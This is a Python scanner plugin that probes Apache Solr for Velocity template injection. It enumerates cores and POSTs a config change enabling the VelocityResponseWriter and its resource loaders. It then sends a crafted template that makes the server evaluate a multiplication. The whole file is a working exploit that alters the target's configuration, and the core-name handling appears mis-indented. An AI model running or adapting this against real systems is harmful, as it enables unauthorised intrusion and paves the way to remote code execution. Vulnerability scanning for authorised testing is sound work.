#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import re
import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.SOLR

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in [self.base_url, self.base_url + "solr/"]:
                    url = path + 'admin/cores?wt=json'
                    try:
                        async with session.get(url=url, allow_redirects=False) as res:
                            if res and res.status == 200:
                                text = await res.text()
                                if 'responseHeader' in text:
                                    matchObj = re.search(r'"name":"(?P<core>.*?)"', text)
                                    if matchObj:
                                        name = matchObj.group(1)
                                        headers = {'Content-Type': 'application/json'}
                                        ran1 = random.randint(100, 999)
                                        ran2 = random.randint(100, 999)
                                        data = '''{
"update-queryresponsewriter": {
    "startup": "test",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
    }
}'''
                                    url1 = path + name + '/config'
                                    async with session.post(url=url1, headers=headers, data=data,
                                                            allow_redirects=False) as res1:
                                        if res1 and res1.status == 200:
                                            url2 = path+ name + '/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{ran1}%20*%20{ran2})%24c'.format(ran1=ran1, ran2=ran2)
                                            async with session.get(url=url2, allow_redirects=False) as res2:
                                                text2 = await res2.text()
                                                if str(ran1 * ran2) in text2:
                                                    yield url
                    except:
                        pass